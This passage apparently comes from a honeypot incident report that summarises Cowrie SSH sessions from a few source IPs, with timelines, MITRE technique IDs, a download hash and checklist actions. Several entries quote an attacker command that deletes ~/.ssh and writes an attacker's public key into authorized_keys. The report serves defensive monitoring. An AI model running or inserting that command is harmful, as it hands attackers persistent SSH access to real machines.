| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:38:41` | `cowrie.session.connect` |
| `2026-06-07 13:38:41` | `cowrie.client.version` |
| `2026-06-07 13:38:41` | `cowrie.client.kex` |
| `2026-06-07 13:38:41` | `cowrie.login.success` |
| `2026-06-07 13:38:41` | `cowrie.session.params` |
| `2026-06-07 13:38:41` | `cowrie.command.input` |
| `2026-06-07 13:38:41` | `cowrie.command.failed` |
| `2026-06-07 13:38:41` | `cowrie.log.closed` |
| `2026-06-07 13:38:41` | `cowrie.session.params` |
| `2026-06-07 13:38:41` | `cowrie.command.input` |
| `2026-06-07 13:38:41` | `cowrie.session.file_download` |
| `2026-06-07 13:38:41` | `cowrie.log.closed` |
| `2026-06-07 13:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2ccdbcf47b

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:38 |
| **Last Seen** | 2026-06-07 13:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:38:42` | `cowrie.session.connect` |
| `2026-06-07 13:38:42` | `cowrie.client.version` |
| `2026-06-07 13:38:42` | `cowrie.client.kex` |
| `2026-06-07 13:38:42` | `cowrie.login.success` |
| `2026-06-07 13:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcec6af004fd

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:43 |
| **Last Seen** | 2026-06-07 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:43:10` | `cowrie.session.connect` |
| `2026-06-07 13:43:10` | `cowrie.client.version` |
| `2026-06-07 13:43:10` | `cowrie.client.kex` |
| `2026-06-07 13:43:11` | `cowrie.login.success` |
| `2026-06-07 13:43:12` | `cowrie.session.params` |
| `2026-06-07 13:43:12` | `cowrie.command.input` |
| `2026-06-07 13:43:12` | `cowrie.command.failed` |
| `2026-06-07 13:43:12` | `cowrie.log.closed` |
| `2026-06-07 13:43:13` | `cowrie.session.params` |
| `2026-06-07 13:43:13` | `cowrie.command.input` |
| `2026-06-07 13:43:13` | `cowrie.session.file_download` |
| `2026-06-07 13:43:13` | `cowrie.log.closed` |
| `2026-06-07 13:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54131d453149

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:43 |
| **Last Seen** | 2026-06-07 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:43:16` | `cowrie.session.connect` |
| `2026-06-07 13:43:16` | `cowrie.client.version` |
| `2026-06-07 13:43:16` | `cowrie.client.kex` |
| `2026-06-07 13:43:17` | `cowrie.login.success` |
| `2026-06-07 13:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de858a8109f

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:44 |
| **Last Seen** | 2026-06-07 13:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:44:35` | `cowrie.session.connect` |
| `2026-06-07 13:44:35` | `cowrie.client.version` |
| `2026-06-07 13:44:35` | `cowrie.client.kex` |
| `2026-06-07 13:44:35` | `cowrie.login.success` |
| `2026-06-07 13:44:36` | `cowrie.session.params` |
| `2026-06-07 13:44:36` | `cowrie.command.input` |
| `2026-06-07 13:44:36` | `cowrie.command.failed` |
| `2026-06-07 13:44:36` | `cowrie.log.closed` |
| `2026-06-07 13:44:36` | `cowrie.session.params` |
| `2026-06-07 13:44:36` | `cowrie.command.input` |
| `2026-06-07 13:44:36` | `cowrie.session.file_download` |
| `2026-06-07 13:44:36` | `cowrie.log.closed` |
| `2026-06-07 13:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e08e2b37ea2f

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:44 |
| **Last Seen** | 2026-06-07 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:44:38` | `cowrie.session.connect` |
| `2026-06-07 13:44:38` | `cowrie.client.version` |
| `2026-06-07 13:44:38` | `cowrie.client.kex` |
| `2026-06-07 13:44:38` | `cowrie.login.success` |
| `2026-06-07 13:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb650fb141e

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:44 |
| **Last Seen** | 2026-06-07 13:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:44:58` | `cowrie.session.connect` |
| `2026-06-07 13:44:58` | `cowrie.client.version` |
| `2026-06-07 13:44:58` | `cowrie.client.kex` |
| `2026-06-07 13:44:59` | `cowrie.login.success` |
| `2026-06-07 13:45:00` | `cowrie.session.params` |
| `2026-06-07 13:45:00` | `cowrie.command.input` |
| `2026-06-07 13:45:00` | `cowrie.command.failed` |
| `2026-06-07 13:45:00` | `cowrie.log.closed` |
| `2026-06-07 13:45:01` | `cowrie.session.params` |
| `2026-06-07 13:45:01` | `cowrie.command.input` |
| `2026-06-07 13:45:01` | `cowrie.session.file_download` |
| `2026-06-07 13:45:01` | `cowrie.log.closed` |
| `2026-06-07 13:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1cbf2da292

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:45 |
| **Last Seen** | 2026-06-07 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:45:04` | `cowrie.session.connect` |
| `2026-06-07 13:45:04` | `cowrie.client.version` |
| `2026-06-07 13:45:04` | `cowrie.client.kex` |
| `2026-06-07 13:45:05` | `cowrie.login.success` |
| `2026-06-07 13:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e13805582d

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:46 |
| **Last Seen** | 2026-06-07 13:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:46:37` | `cowrie.session.connect` |
| `2026-06-07 13:46:37` | `cowrie.client.version` |
| `2026-06-07 13:46:37` | `cowrie.client.kex` |
| `2026-06-07 13:46:37` | `cowrie.login.success` |
| `2026-06-07 13:46:37` | `cowrie.session.params` |
| `2026-06-07 13:46:37` | `cowrie.command.input` |
| `2026-06-07 13:46:37` | `cowrie.command.failed` |
| `2026-06-07 13:46:38` | `cowrie.log.closed` |
| `2026-06-07 13:46:38` | `cowrie.session.params` |
| `2026-06-07 13:46:38` | `cowrie.command.input` |
| `2026-06-07 13:46:38` | `cowrie.session.file_download` |
| `2026-06-07 13:46:38` | `cowrie.log.closed` |
| `2026-06-07 13:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34045d5b1bfd

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:46 |
| **Last Seen** | 2026-06-07 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:46:40` | `cowrie.session.connect` |
| `2026-06-07 13:46:40` | `cowrie.client.version` |
| `2026-06-07 13:46:40` | `cowrie.client.kex` |
| `2026-06-07 13:46:40` | `cowrie.login.success` |
| `2026-06-07 13:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef810f19a55

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:46 |
| **Last Seen** | 2026-06-07 13:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:46:43` | `cowrie.session.connect` |
| `2026-06-07 13:46:43` | `cowrie.client.version` |
| `2026-06-07 13:46:43` | `cowrie.client.kex` |
| `2026-06-07 13:46:44` | `cowrie.login.success` |
| `2026-06-07 13:46:45` | `cowrie.session.params` |
| `2026-06-07 13:46:45` | `cowrie.command.input` |
| `2026-06-07 13:46:45` | `cowrie.command.failed` |
| `2026-06-07 13:46:45` | `cowrie.log.closed` |
| `2026-06-07 13:46:46` | `cowrie.session.params` |
| `2026-06-07 13:46:46` | `cowrie.command.input` |
| `2026-06-07 13:46:46` | `cowrie.session.file_download` |
| `2026-06-07 13:46:46` | `cowrie.log.closed` |
| `2026-06-07 13:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac14ab5e1da

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 13:46 |
| **Last Seen** | 2026-06-07 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:46:49` | `cowrie.session.connect` |
| `2026-06-07 13:46:49` | `cowrie.client.version` |
| `2026-06-07 13:46:49` | `cowrie.client.kex` |
| `2026-06-07 13:46:50` | `cowrie.login.success` |
| `2026-06-07 13:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a0f02b7931

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:49 |
| **Last Seen** | 2026-06-07 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:49:12` | `cowrie.session.connect` |
| `2026-06-07 13:49:12` | `cowrie.client.version` |
| `2026-06-07 13:49:12` | `cowrie.client.kex` |
| `2026-06-07 13:49:12` | `cowrie.login.success` |
| `2026-06-07 13:49:12` | `cowrie.session.params` |
| `2026-06-07 13:49:12` | `cowrie.command.input` |
| `2026-06-07 13:49:12` | `cowrie.command.failed` |
| `2026-06-07 13:49:12` | `cowrie.log.closed` |
| `2026-06-07 13:49:12` | `cowrie.session.params` |
| `2026-06-07 13:49:12` | `cowrie.command.input` |
| `2026-06-07 13:49:12` | `cowrie.session.file_download` |
| `2026-06-07 13:49:12` | `cowrie.log.closed` |
| `2026-06-07 13:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c55dad2df5ac

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:49 |
| **Last Seen** | 2026-06-07 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:49:13` | `cowrie.session.connect` |
| `2026-06-07 13:49:13` | `cowrie.client.version` |
| `2026-06-07 13:49:13` | `cowrie.client.kex` |
| `2026-06-07 13:49:13` | `cowrie.login.success` |
| `2026-06-07 13:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b38a70314a99

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:52 |
| **Last Seen** | 2026-06-07 13:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:52:57` | `cowrie.session.connect` |
| `2026-06-07 13:52:57` | `cowrie.client.version` |
| `2026-06-07 13:52:57` | `cowrie.client.kex` |
| `2026-06-07 13:52:57` | `cowrie.login.success` |
| `2026-06-07 13:52:57` | `cowrie.session.params` |
| `2026-06-07 13:52:57` | `cowrie.command.input` |
| `2026-06-07 13:52:57` | `cowrie.command.failed` |
| `2026-06-07 13:52:58` | `cowrie.log.closed` |
| `2026-06-07 13:52:58` | `cowrie.session.params` |
| `2026-06-07 13:52:58` | `cowrie.command.input` |
| `2026-06-07 13:52:58` | `cowrie.session.file_download` |
| `2026-06-07 13:52:58` | `cowrie.log.closed` |
| `2026-06-07 13:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be791dd55d4f

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:53 |
| **Last Seen** | 2026-06-07 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:53:00` | `cowrie.session.connect` |
| `2026-06-07 13:53:00` | `cowrie.client.version` |
| `2026-06-07 13:53:00` | `cowrie.client.kex` |
| `2026-06-07 13:53:00` | `cowrie.login.success` |
| `2026-06-07 13:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad44e630a9c8

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:53 |
| **Last Seen** | 2026-06-07 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:53:20` | `cowrie.session.connect` |
| `2026-06-07 13:53:20` | `cowrie.client.version` |
| `2026-06-07 13:53:20` | `cowrie.client.kex` |
| `2026-06-07 13:53:20` | `cowrie.login.success` |
| `2026-06-07 13:53:20` | `cowrie.session.params` |
| `2026-06-07 13:53:20` | `cowrie.command.input` |
